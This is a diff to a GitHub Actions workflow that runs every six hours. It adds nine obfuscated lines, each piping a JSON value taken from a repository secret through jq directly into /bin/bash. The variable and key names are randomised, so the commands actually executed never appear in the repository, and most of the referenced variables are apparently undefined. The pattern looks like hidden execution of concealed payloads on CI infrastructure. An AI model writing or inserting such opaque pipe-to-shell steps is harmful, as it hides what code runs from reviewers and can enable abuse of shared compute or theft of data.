@@ -3,7 +3,8 @@ name: liaojiexcv
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 1/6 * * *'
+    - cron: '37 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +13,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: liaojiexcv
         env:
-          wm8: ${{ secrets.wm8 }}
+          w6042: ${{ secrets.w6042 }}
         run: |
-          echo $wm8 | jq -r .amz866 | /bin/bash
-          echo $vemz08 | jq -r .i332 | /bin/bash
-          echo $ibw0799 | jq -r .v45700 | /bin/bash
-          echo $ka27 | jq -r .f1709 | /bin/bash
-          echo $hgs674 | jq -r .bfz03435 | /bin/bash
-          echo $sl66071 | jq -r .q40 | /bin/bash
-          echo $kfolb70 | jq -r .qjhc707 | /bin/bash
+          echo $w6042 | jq -r .nwe035 | /bin/bash
+          echo $i23 | jq -r .g08 | /bin/bash
+          echo $xaem92 | jq -r .blr3 | /bin/bash
+          echo $zob01884 | jq -r .n442 | /bin/bash
+          echo $x8 | jq -r .djne0 | /bin/bash
+          echo $swzve99 | jq -r .dnwp4467 | /bin/bash
+          echo $nfri643 | jq -r .bno88332 | /bin/bash
+          echo $ol25 | jq -r .sgjse27 | /bin/bash
+          echo $bmvh91 | jq -r .aejc65 | /bin/bash
 
